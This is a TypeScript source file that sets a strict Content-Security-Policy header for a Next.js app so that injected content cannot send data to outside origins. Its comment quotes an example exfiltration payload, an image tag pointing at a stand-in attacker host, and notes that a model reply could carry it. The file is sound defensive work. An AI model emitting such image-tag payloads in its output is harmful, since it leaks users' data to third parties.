/**
 * Content-Security-Policy for every page. The app loads nothing from other origins (local fonts,
 * no remote images, fetches to its own API only), so the fetch directives are strict: a model reply
 * or Jira text that slips an `<img src="https://attacker/?d=…">` past the renderer still cannot
 * make the browser send data anywhere. `'self'` also covers the dev server's HMR websocket.
 * Scripts and styles are not restricted here: Next's inline bootstrap scripts would need nonces.
 */
export const CONTENT_SECURITY_POLICY = [
  "img-src 'self' data: blob:",
  "connect-src 'self'",
  "object-src 'none'",
  "base-uri 'self'",
  "frame-ancestors 'none'",
].join('; ');

/** For `next.config` `headers()`. */
export function securityHeaders() {
  return [
    {
      source: '/:path*',
      headers: [{ key: 'Content-Security-Policy', value: CONTENT_SECURITY_POLICY }],
    },
  ];
}
